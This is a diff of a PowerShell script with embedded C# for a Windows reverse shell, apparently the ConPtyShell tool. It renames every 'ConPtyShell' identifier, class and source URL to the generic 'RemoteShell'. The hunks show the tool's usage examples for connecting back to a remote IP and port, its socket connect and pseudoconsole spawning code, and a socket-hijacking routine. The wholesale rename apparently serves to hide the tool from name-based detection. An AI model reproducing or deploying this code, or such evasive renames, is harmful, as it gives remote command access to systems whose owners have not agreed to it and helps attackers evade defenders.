@@ -1,14 +1,14 @@
-function Invoke-ConPtyShell
+function Invoke-RemoteShell
 {   
     <#
         .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows 
+            RemoteShell - Fully Interactive Reverse Shell for Windows 
             Author: splinter_code
             License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
+            Source: https://github.com/antonioCoco/RemoteShell
         
         .DESCRIPTION
-            ConPtyShell - Fully interactive reverse shell for Windows
+            RemoteShell - Fully interactive reverse shell for Windows
             
             Properly set the rows and cols values. You can retrieve it from
             your terminal with the command "stty size".
@@ -40,28 +40,28 @@ function Invoke-ConPtyShell
             Default: "powershell.exe"
             
         .EXAMPLE  
-            PS>Invoke-ConPtyShell 10.0.0.2 3001
+            PS>Invoke-RemoteShell 10.0.0.2 3001
             
             Description
             -----------
             Spawn a reverse shell
 
         .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
+            PS>Invoke-RemoteShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
             
             Description
             -----------
             Spawn a reverse shell with specific rows and cols size
             
          .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
+            PS>Invoke-RemoteShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
             
             Description
             -----------
             Spawn a reverse shell (cmd.exe) with specific rows and cols size
             
         .EXAMPLE
-            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
+            PS>Invoke-RemoteShell -Upgrade -Rows 30 -Cols 90
             
             Description
             -----------
@@ -109,9 +109,9 @@ function Invoke-ConPtyShell
             throw "RemotePort missing parameter"
         }
     }
-    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
+    $parametersRemoteShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Add-Type -TypeDefinition $Source -Language CSharp;
-    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
+    $output = [RemoteShellMainClass]::RemoteShellMain($parametersRemoteShell)
     Write-Output $output
 }
 
@@ -128,13 +128,13 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
-public class ConPtyShellException : Exception
+public class RemoteShellException : Exception
 {
-    private const string error_string = "[-] ConPtyShellException: ";
+    private const string error_string = "[-] RemoteShellException: ";
 
-    public ConPtyShellException() { }
+    public RemoteShellException() { }
 
-    public ConPtyShellException(string message) : base(error_string + message) { }
+    public RemoteShellException(string message) : base(error_string + message) { }
 }
 
 public class DeadlockCheckHelper
@@ -866,7 +866,7 @@ public static class SocketHijacking
             }
         }
         if (targetSocketHandle == IntPtr.Zero)
-            throw new ConPtyShellException("No sockets found, so no hijackable sockets :( Exiting...");
+            throw new RemoteShellException("No sockets found, so no hijackable sockets :( Exiting...");
         return targetSocketHandle;
     }
     public static void SetSocketBlockingMode(IntPtr socket, int mode)
@@ -880,7 +880,7 @@ public static class SocketHijacking
         else
             result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
         if (result == -1)
-            throw new ConPtyShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            throw new RemoteShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
     }
 }
 
@@ -916,7 +916,7 @@ public struct ParentProcessUtilities
         int returnLength;
         int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
         if (status != 0)
-            throw new ConPtyShellException(status.ToString());
+            throw new RemoteShellException(status.ToString());
         try
         {
             return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
@@ -929,9 +929,9 @@ public struct ParentProcessUtilities
     }
 }
 
-public static class ConPtyShell
+public static class RemoteShell
 {
-    private const string errorString = "{{{ConPtyShellException}}}\r\n";
+    private const string errorString = "{{{RemoteShellException}}}\r\n";
     private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
     private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
     private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
@@ -1157,7 +1157,7 @@ public static class ConPtyShell
     {
         WSAData data;
         if (WSAStartup(2 << 8 | 2, out data) != 0)
-            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+            throw new RemoteShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
     }
 
     private static IntPtr connectRemote(string remoteIp, int remotePort)
@@ -1172,7 +1172,7 @@ public static class ConPtyShell
         }
         catch
         {
-            throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
+            throw new RemoteShellException("Specified port is invalid: " + remotePort.ToString());
         }
 
         IntPtr socket = IntPtr.Zero;
@@ -1185,7 +1185,7 @@ public static class ConPtyShell
         if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
         {
             error = WSAGetLastError();
-            throw new ConPtyShellException(String.Format("WSAConnect failed with error code: {0}", error));
+            throw new RemoteShellException(String.Format("WSAConnect failed with error code: {0}", error));
         }
 
         return socket;
@@ -1221,9 +1221,9 @@ public static class ConPtyShell
         pSec.bInheritHandle = 1;
         pSec.lpSecurityDescriptor = IntPtr.Zero;
         if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new ConPtyShellException("Could not create the InputPipe");
+            throw new RemoteShellException("Could not create the InputPipe");
         if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new ConPtyShellException("Could not create the OutputPipe");
+            throw new RemoteShellException("Could not create the OutputPipe");
     }
 
     private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
@@ -1251,12 +1251,12 @@ public static class ConPtyShell
         IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         if (!GetConsoleMode(hStdOut, out outConsoleMode))
         {
-            throw new ConPtyShellException("Could not get console mode");
+            throw new RemoteShellException("Could not get console mode");
         }
         outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
         if (!SetConsoleMode(hStdOut, outConsoleMode))
         {
-            throw new ConPtyShellException("Could not enable virtual terminal processing");
+            throw new RemoteShellException("Could not enable virtual terminal processing");
         }
     }
 
@@ -1277,7 +1277,7 @@ public static class ConPtyShell
         bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
         if (success || lpSize == IntPtr.Zero)
         {
-            throw new ConPtyShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            throw new RemoteShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
         startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -1285,12 +1285,12 @@ public static class ConPtyShell
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
         {
-            throw new ConPtyShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            throw new RemoteShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
         success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
-            throw new ConPtyShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            throw new RemoteShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
         return startupInfo;
     }
@@ -1306,7 +1306,7 @@ public static class ConPtyShell
         bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (!success)
         {
-            throw new ConPtyShellException("Could not create process. " + Marshal.GetLastWin32Error());
+            throw new RemoteShellException("Could not create process. " + Marshal.GetLastWin32Error());
         }
         return pInfo;
     }
@@ -1443,7 +1443,7 @@ public static class ConPtyShell
         return thReadSocketWritePipe;
     }
 
-    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    public static string SpawnRemoteShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
     {
         IntPtr shellSocket = IntPtr.Zero;
         IntPtr InputPipeRead = IntPtr.Zero;
@@ -1492,7 +1492,7 @@ public static class ConPtyShell
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
-                            throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
+                            throw new RemoteShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                         }
                         else
                         {
@@ -1602,12 +1602,12 @@ public static class ConPtyShell
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
         if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
         if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
-        output += "ConPtyShell kindly exited.\r\n";
+        output += "RemoteShell kindly exited.\r\n";
         return output;
     }
 }
 
-public static class ConPtyShellMainClass
+public static class RemoteShellMainClass
 {
     private static string help = @"";
 
@@ -1619,7 +1619,7 @@ public static class ConPtyShellMainClass
     private static void CheckArgs(string[] arguments)
     {
         if (arguments.Length < 2)
-            throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+            throw new RemoteShellException("\r\nRemoteShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
 
     private static void DisplayHelp()
@@ -1631,7 +1631,7 @@ public static class ConPtyShellMainClass
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new ConPtyShellException("\r\nConPtyShell: Invalid remoteIp value" + ipString);
+            throw new RemoteShellException("\r\nRemoteShell: Invalid remoteIp value" + ipString);
         return ipString;
     }
 
@@ -1639,7 +1639,7 @@ public static class ConPtyShellMainClass
     {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
-            throw new ConPtyShellException("\r\nConPtyShell: Invalid integer value " + arg);
+            throw new RemoteShellException("\r\nRemoteShell: Invalid integer value " + arg);
         return ret;
     }
 
@@ -1667,7 +1667,7 @@ public static class ConPtyShellMainClass
         return commandLine;
     }
 
-    public static string ConPtyShellMain(string[] args)
+    public static string RemoteShellMain(string[] args)
     {
         string output = "";
         if (args.Length == 1 && HelpRequired(args[0]))
@@ -1692,7 +1692,7 @@ public static class ConPtyShellMainClass
                 uint rows = ParseRows(args);
                 uint cols = ParseCols(args);
                 string commandLine = ParseCommandLine(args);
-                output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+                output = RemoteShell.SpawnRemoteShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
             catch (Exception e)
             {
@@ -1708,7 +1708,7 @@ class MainClass
 {
     static void Main(string[] args)
     {
-        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
+        Console.Out.Write(RemoteShellMainClass.RemoteShellMain(args));
     }
 }
 
